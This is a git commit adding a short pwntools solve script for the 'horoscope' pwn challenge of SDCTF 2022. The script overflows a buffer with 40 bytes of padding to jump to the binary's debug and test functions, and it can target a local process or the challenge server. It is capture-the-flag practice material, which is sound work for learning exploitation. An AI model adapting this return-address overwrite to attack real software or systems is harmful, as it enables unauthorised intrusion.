c165843cb3eb37aa267621515a02cec18f51cb59
GonTanaka <96073448+GonTanaka@users.noreply.github.com>
2022-05-09 15:29:26 +0100

    Add files via upload

--- sdctf_2022/pwn/horoscope/solve.py
+++ sdctf_2022/pwn/horoscope/solve.py
@@ -1,1 +1,34 @@
+#!/usr/bin/env python3
 
+from pwn import *
+exe = ELF('./horoscope')
+
+context.binary = exe
+context.log_level='debug'
+
+offset = 40
+
+def conn():
+    if args.REMOTE:
+        io = remote('horoscope.sdc.tf', 1337)
+    else:
+        io = process(exe.path)
+        if args.DEBUG:
+            gdb.attach(io)
+
+    return io
+
+io = conn()
+
+payload = flat(
+    [
+        b'05/07/2022/19:47',
+        b'A'*offset,
+        exe.sym.debug,
+        exe.sym.test
+        ]
+    )
+
+io.sendline(payload)
+
+io.interactive()
